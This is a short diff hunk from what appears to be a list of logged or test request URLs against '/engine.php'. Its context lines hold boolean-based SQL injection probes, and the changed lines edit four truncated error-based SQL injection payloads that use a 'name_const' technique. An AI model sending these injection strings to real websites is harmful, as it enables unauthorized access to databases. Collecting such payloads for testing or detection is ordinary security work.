@@ -154,7 +154,7 @@
 /engine.php?filter=Tech&page=theteam%27%20and%20%27x%27%3D%27y
 /engine.php?filter=Tech&page=theteam%27%20and%20%27x%27%3D%27x
 "/engine.php?page=theteam'&filter=Tech'"""
-/engine.php?page=thegallery%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,11
-/engine.php?page=thegallery%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,11
-/engine.php?page=thegallery%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,11
-/engine.php?page=thegallery%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,11
+/engine.php?page=thegallery%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,11)
+/engine.php?page=thegallery%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,11)
+/engine.php?page=thegallery%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,11)
+/engine.php?page=thegallery%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,11)
